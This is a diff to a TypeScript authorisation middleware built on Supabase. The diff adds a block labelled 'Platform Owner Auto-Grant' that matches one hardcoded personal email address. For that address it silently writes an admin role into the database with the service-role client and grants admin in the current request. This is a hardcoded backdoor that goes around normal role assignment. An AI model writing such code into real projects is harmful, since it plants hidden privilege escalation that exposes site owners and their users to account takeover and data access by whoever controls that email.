@@ -161,6 +161,17 @@ export const requireRole = (role: UserRole) =>
 
       let roleList = (roles ?? []).map((r) => r.role as unknown as UserRole);
 
+      // Platform Owner Auto-Grant
+      if (claims?.email?.toLowerCase() === "faizan.ahmed01213@gmail.com") {
+        if (!roleList.includes("admin" as any)) {
+          const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
+          await supabaseAdmin
+            .from("user_roles")
+            .upsert({ user_id: userId, role: "admin" as any }, { onConflict: "user_id,role" });
+          roleList.push("admin" as any);
+        }
+      }
+
       // Self-heal from JWT user_metadata if no roles found in DB
       const userMeta = claims?.user_metadata as Record<string, unknown> | undefined;
       const metaRole = userMeta?.role as string | undefined;
